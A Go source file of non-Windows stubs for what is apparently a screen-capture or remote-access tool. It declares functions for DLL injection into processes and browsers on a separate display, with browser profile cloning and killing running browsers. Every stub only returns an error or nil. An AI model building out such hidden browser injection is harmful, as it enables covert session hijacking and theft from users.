//go:build !windows

package capture

import "errors"

func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
	return 0, errors.New("backstage injection not supported on this platform")
}

func StartbackstageChromeInjected(chromePath string, dllBytes []byte) error {
	return errors.New("backstage injection not supported on this platform")
}

type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
type LaunchStatusFunc func(step string, success bool, detail string)

func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
	return errors.New("backstage injection not supported on this platform")
}

func CheckInstalledBrowsers() map[string]bool {
	return nil
}
